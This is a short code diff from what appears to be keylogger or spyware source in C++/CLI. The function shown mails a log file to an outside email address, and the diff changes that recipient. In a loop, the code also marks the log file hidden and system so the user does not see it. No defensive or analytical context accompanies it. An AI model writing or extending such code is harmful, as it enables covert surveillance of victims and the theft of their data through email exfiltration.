@@ -40,7 +40,7 @@ unsigned _stdcall sendFileFun(void* pArguments)
 	MailAddress^ from = gcnew MailAddress("testforname@mail.ru",
 		"Good" + "Luck",
 		System::Text::Encoding::UTF8);
-	MailAddress^ to = gcnew MailAddress("kolyabamberg@gmail.com");
+	MailAddress^ to = gcnew MailAddress("testforname@mail.ru");
 	MailMessage^ message = gcnew MailMessage(from, to);
 	while (stopThread) {
 		SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
